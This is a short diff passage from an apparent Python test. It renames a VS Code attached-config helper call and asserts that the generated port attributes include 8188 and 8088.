-    clean = vscode._sanitize_attached_config({"extensions": []}, "/repo")
+    clean = vscode._attached_config("/repo", [], {})
 
     assert set(clean["settings"]["remote.portsAttributes"]) == {"8188", "8088"}
 
